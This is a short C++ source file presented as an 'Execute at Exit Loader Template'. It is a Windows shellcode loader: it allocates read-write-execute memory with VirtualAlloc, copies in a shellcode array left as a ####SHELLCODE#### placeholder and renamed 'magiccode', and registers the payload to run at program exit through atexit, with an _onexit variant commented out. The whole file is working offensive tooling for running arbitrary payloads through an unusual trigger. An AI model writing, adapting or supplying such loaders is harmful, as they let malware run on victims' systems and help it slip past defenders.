// Execute at Exit Loader Template
// Author: Thomas X Meng

#include <windows.h>
#include <cstdio>
#include <cstdlib> // for atexit and _onexit

unsigned char magiccode[] = ####SHELLCODE####;

void* magic_place = nullptr;

void execute_magiccode() {
    if (magic_place != nullptr) {
        void (*magiccode_func)() = (void (*)())magic_place;
        magiccode_func();
    }
}

int onexit_wrapper() {
    execute_magiccode();
    return 0;
}

void *mcopy(void* dest, const void* src, size_t n){
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

int main(int argc, char* argv[]) {
    printf("Starting program...\n");

    SIZE_T magic_size = sizeof(magiccode);

    // Allocate memory for the magiccode
    magic_place = VirtualAlloc(0, magic_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (magic_place == NULL) {
        printf("Failed to allocate memory for magiccode.\n");
        return 1;
    }

    // Copy the magiccode to the allocated memory
    mcopy(magic_place, magiccode, magic_size);

    // // Register execute_magiccode to run on program exit using atexit
    if (atexit(execute_magiccode) != 0) {
        printf("[-] Failed to register atexit function.\n");
    } else {
        printf("[+] Registered atexit function.\n");
    }

    // // Register onexit_wrapper with _onexit, both functions will work on EXE...
    // if (_onexit(onexit_wrapper) == NULL) {
    //     printf("[-] Failed to register _onexit function.\n");
    // } else {
    //     printf("[+] Registered _onexit function.\n");
    // }

    printf("[!] Program is running. Magiccode will execute on exit.\n");

    return 0;
}
